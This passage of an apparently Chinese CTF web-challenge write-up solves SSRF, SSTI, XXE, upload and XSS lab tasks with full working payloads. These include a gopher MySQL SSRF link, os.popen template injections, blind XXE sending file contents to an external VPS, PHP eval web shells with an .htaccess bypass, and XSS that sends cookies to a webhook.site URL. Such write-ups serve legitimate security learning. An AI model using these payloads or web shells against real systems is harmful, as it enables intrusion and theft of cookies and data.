class="variable">$ch</span>);</span><br></pre></td></tr></table></figure>

<h2 id="ssrf-mysql"><a href="#ssrf-mysql" class="headerlink" title="ssrf - mysql"></a>ssrf - mysql</h2><p>flag is in warmup@mysqldb:3306<br>you can get it with select flag from ctf.warmup</p>
<p>可以用dict探测出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://mysqldb:3306/</span><br></pre></td></tr></table></figure>

<p>gopherus直接打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br><span class="line"></span><br><span class="line">Give MySQL username: warmup                                                  </span><br><span class="line">Give query to execute: select flag from ctf.warmup</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF :                                       </span><br><span class="line">                                                                             </span><br><span class="line">gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%77%61%72%6d%75%70%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%1c%00%00%00%03%73%65%6c%65%63%74%20%66%6c%61%67%20%66%72%6f%6d%20%63%74%66%2e%77%61%72%6d%75%70%01%00%00%00%01</span><br></pre></td></tr></table></figure>

<p>这里注意本题要把127.0.0.1:3306改为mysqldb:3306</p>
<p>然后把_后面的部分url编码一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25a5%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2577%2561%2572%256d%2575%2570%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%251c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2563%2574%2566%252e%2577%2561%2572%256d%2575%2570%2501%2500%2500%2500%2501</span><br></pre></td></tr></table></figure>

<p>直接访问<code>http://web1.0ops.sjtu.cn:40021/file/index.php?url=gopher://mysqldb:3306/_%25a5%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2577%2561%2572%256d%2575%2570%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%251c%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2566%256c%2561%2567%2520%2566%2572%256f%256d%2520%2563%2574%2566%252e%2577%2561%2572%256d%2575%2570%2501%2500%2500%2500%2501</code>即可看到flag</p>
<blockquote>
<p>0ops{f1c723c0549f7223f3da2ee69753df1d}</p>
</blockquote>
<h2 id="ssti-warmup"><a href="#ssti-warmup" class="headerlink" title="ssti - warmup"></a>ssti - warmup</h2><p>直接访问&#x2F;flag提示不是admin，考虑jwt伪造</p>
<p>先读密钥<br>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#x27;SECRET_KEY&#x27;: b&#x27;_5#yfkfkeeriiwoerwerowrwerwffksks/&#x27;</span><br></pre></td></tr></table></figure>

<p>其实直接读源码也行</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&quot;cat app.py&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{config_url_for_self_request}</p>
</blockquote>
<h2 id="ssti-getshell"><a href="#ssti-getshell" class="headerlink" title="ssti - getshell"></a>ssti - getshell</h2><p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__.os.popen(&quot;cat 2b75169753203a9ee3448efb59ebe2c8&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{sst1_getshe11_by_url_for_or_for_if_or_others}</p>
</blockquote>
<h2 id="xxe-warmup"><a href="#xxe-warmup" class="headerlink" title="xxe - warmup"></a>xxe - warmup</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/basic/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="literal">null</span>, LIBXML_NOENT);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$xml</span>);</span><br></pre></td></tr></table></figure>

<p>flag在&#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;flag.php，直接xxe用php伪协议读即可</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://web1.0ops.sjtu.cn:40005/basic/index.php&quot;</span></span><br><span class="line">burp0_data = &#123;<span class="string">&quot;data&quot;</span>: <span class="string">&quot;&lt;?xml version=&#x27;1.0&#x27;?&gt;&lt;!DOCTYPE copyright[&lt;!ENTITY test SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/basic/flag.php&#x27;&gt;]&gt;&lt;reset&gt;&lt;login&gt;&amp;test;&lt;/login&gt;&lt;secret&gt;login&lt;/secret&gt;&lt;/reset&gt;&quot;</span>&#125;</span><br><span class="line">res = requests.post(burp0_url, data=burp0_data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{f0a8f5d8051a19ec7be940f03884babd}</p>
</blockquote>
<h2 id="xxe-blind"><a href="#xxe-blind" class="headerlink" title="xxe - blind"></a>xxe - blind</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/blind/&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$xml</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$data</span>, <span class="literal">null</span>, LIBXML_NOENT);</span><br></pre></td></tr></table></figure>

<p>xxe无回显</p>
<p>首先在vps上放一个test.dtd</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % dtd &quot;&lt;!ENTITY &amp;#x25; showflag SYSTEM &#x27;http://47.120.14.151:9090/%file&#x27;&gt;&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%showflag;</span><br></pre></td></tr></table></figure>
<p>注意test.dtd中%要经过实体编码成&#x25;</p>
<p>然后监听9090端口</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://web1.0ops.sjtu.cn:40005/blind/index.php&quot;</span></span><br><span class="line">burp0_data = &#123;<span class="string">&quot;data&quot;</span>: <span class="string">&quot;&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;&lt;!DOCTYPE updateProfile [&lt;!ENTITY % file SYSTEM &#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/blind/flag.php&#x27;&gt;&lt;!ENTITY % dtds SYSTEM &#x27;http://47.120.14.151/test.dtd&#x27;&gt;%dtds;]&gt;&lt;root&gt;1&lt;/root&gt;&quot;</span>&#125;</span><br><span class="line">res = requests.post(burp0_url, data=burp0_data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{1375076098682905dbbdbf4e6c04d0f3}</p>
</blockquote>
<h2 id="upload-warmup"><a href="#upload-warmup" class="headerlink" title="upload - warmup"></a>upload - warmup</h2><p>先写一个上传页面</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据包POC<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web1.0ops.sjtu.cn:40010/file/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--链接是当前打开的题目链接--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>传一个木马上去<br>1.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>貌似需要绕disable_functions</p>
<p>经过尝试，可以用以下payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=var_dump(scandir(&#x27;/flag&#x27;));</span><br><span class="line"></span><br><span class="line">1=highlight_file(&#x27;/flag/450eb6101d76c3152eb67d0e9fb4f6d6.flag&#x27;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{da7b4d53e211dbc9ce7743542c19c36a}</p>
</blockquote>
<h2 id="upload-htaccess"><a href="#upload-htaccess" class="headerlink" title="upload - htaccess"></a>upload - htaccess</h2><p>前面同上题，但是由于带ph后缀的文件名被ban，所有用.htaccess绕过</p>
<p>先传.htaccess</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;shell.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>再传shell.jpg</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>之后访问shell.jpg执行命令就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1=var_dump(scandir(&#x27;/flag&#x27;));</span><br><span class="line"></span><br><span class="line">1=highlight_file(&#x27;/flag/030f6179ffb723b7a6db6bb54e811035&#x27;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{htaccess_AddType_application_x-httpd-php}</p>
</blockquote>
<h2 id="upload-bypass-1"><a href="#upload-bypass-1" class="headerlink" title="upload - bypass 1"></a>upload - bypass 1</h2><p>同上题</p>
<blockquote>
<p>0ops{phar_zip_8a40bbc0e76266ed3c97}</p>
</blockquote>
<h2 id="xss-warmup"><a href="#xss-warmup" class="headerlink" title="xss - warmup"></a>xss - warmup</h2><p>首先需要爆破满足 substr(md5(captcha),0,5) &#x3D;&#x3D; 66f97 条件的验证码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">worker</span>(<span class="params">start, end, target, charset, length</span>):</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start, end):</span><br><span class="line">        <span class="comment"># 生成当前尝试的验证码</span></span><br><span class="line">        captcha = <span class="string">&#x27;&#x27;</span>.join([</span><br><span class="line">            charset[(num // (<span class="built_in">len</span>(charset) ** i)) % <span class="built_in">len</span>(charset)] </span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(length-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>)</span><br><span class="line">        ])</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算MD5哈希值</span></span><br><span class="line">        hash_md5 = hashlib.md5(captcha.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查前5位是否匹配</span></span><br><span class="line">        <span class="keyword">if</span> hash_md5[:<span class="number">5</span>] == target:</span><br><span class="line">            <span class="keyword">return</span> captcha</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force_md5</span>(<span class="params">target, charset=<span class="string">&quot;0123456789&quot;</span>, min_length=<span class="number">4</span>, max_length=<span class="number">6</span>, threads=<span class="number">8</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 开始爆破目标: <span class="subst">&#123;target&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 字符集: <span class="subst">&#123;charset&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 验证码长度范围: <span class="subst">&#123;min_length&#125;</span>-<span class="subst">&#123;max_length&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] 使用线程数: <span class="subst">&#123;threads&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    start_time = time.time()</span><br><span class="line">    total_attempts = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的验证码长度</span></span><br><span class="line">    <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(min_length, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># 计算当前长度的所有组合数</span></span><br><span class="line">        combinations = <span class="built_in">len</span>(charset) ** length</span><br><span class="line">        total_attempts += combinations</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n[*] 尝试长度 <span class="subst">&#123;length&#125;</span> 的验证码 (组合数: <span class="subst">&#123;combinations:,&#125;</span>)&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算每个线程的工作量</span></span><br><span class="line">        chunk_size = combinations // threads</span><br><span class="line">        futures = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">with</span> ThreadPoolExecutor(max_workers=threads) <span class="keyword">as</span> executor:</span><br><span class="line">            <span class="comment"># 创建任务</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads):</span><br><span class="line">                start = i * chunk_size</span><br><span class="line">                end = (i + <span class="number">1</span>) * chunk_size <span class="keyword">if</span> i &lt; threads - <span class="number">1</span> <span class="keyword">else</span> combinations</span><br><span class="line">                futures.append(executor.submit(worker, start, end, target, charset, length))</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查结果</span></span><br><span class="line">            <span class="keyword">for</span> future <span class="keyword">in</span> futures:</span><br><span class="line">                result = future.result()</span><br><span class="line">                <span class="keyword">if</span> result:</span><br><span class="line">                    elapsed = time.time() - start_time</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 找到验证码: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] MD5 哈希值: <span class="subst">&#123;hashlib.md5(result.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 耗时: <span class="subst">&#123;elapsed:<span class="number">.2</span>f&#125;</span> 秒&quot;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;[+] 尝试次数: <span class="subst">&#123;total_attempts:,&#125;</span>&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> result</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] 长度 <span class="subst">&#123;length&#125;</span> 未找到匹配项&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[!] 爆破完成，未找到匹配的验证码&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;使用方法: python md5_bruteforce.py &lt;target&gt;&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;示例: python md5_bruteforce.py 4a7ea&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    target = sys.argv[<span class="number">1</span>].lower()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 验证目标格式</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(target) != <span class="number">5</span> <span class="keyword">or</span> <span class="keyword">not</span> <span class="built_in">all</span>(c <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdef&#x27;</span> <span class="keyword">for</span> c <span class="keyword">in</span> target):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;错误: 目标必须是5位十六进制字符串 (0-9, a-f)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 配置参数</span></span><br><span class="line">    charset = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>  <span class="comment"># 字母数字字符集</span></span><br><span class="line">    min_length = <span class="number">4</span></span><br><span class="line">    max_length = <span class="number">6</span></span><br><span class="line">    threads = <span class="number">8</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 开始爆破</span></span><br><span class="line">    brute_force_md5(target, charset, min_length, max_length, threads)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [+] 找到验证码: fM3k</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=&quot;https://webhook.site/37026723-0fcd-499b-9232-a6969857a8ec/?cookie=&quot; + document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{2344f468d48fbccac337c11a640f6077}</p>
</blockquote>
<h2 id="xss-gadget"><a href="#xss-gadget" class="headerlink" title="xss - gadget"></a>xss - gadget</h2><p>先跟上题一样，爆破出验证码为2Dnl</p>
<p>Wappalyzer判断出页面是jquerymobile框架，根据<code>https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/ue/jquerymobile_exploit.php</code>可以采用下面的payload</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&#x27;--&gt;</span><br><span class="line">&amp;lt;script&amp;gt;new Image().src=&quot;https://webhook.site/37026723-0fcd-499b-9232-a6969857a8ec/?cookie=&quot; + document.cookie;&amp;lt;/script&amp;gt;&#x27;&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>0ops{2344f468d48fbccac337c11a640f6077}</p>
</blockquote>
<h2 id="php-rand-1"><a href="#php-rand-1" class="headerlink" title="php - rand - 1"></a>php - rand - 1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span 